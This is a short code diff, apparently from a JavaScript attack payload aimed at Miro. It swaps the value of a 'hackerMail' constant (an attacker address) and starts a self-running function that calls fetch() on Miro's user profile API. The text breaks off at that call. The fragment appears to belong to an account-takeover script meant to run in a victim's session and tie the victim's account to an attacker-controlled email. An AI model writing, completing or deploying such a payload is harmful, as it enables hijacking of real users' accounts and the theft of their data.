@@ -1,4 +1,4 @@
-const hackerMail = "graylen.sitiveni@malldrops.com";
+const hackerMail = "kariana.armahni@malldrops.com";
 
 (() => {
 	fetch("https://miro.com/api/v1/profile/", {
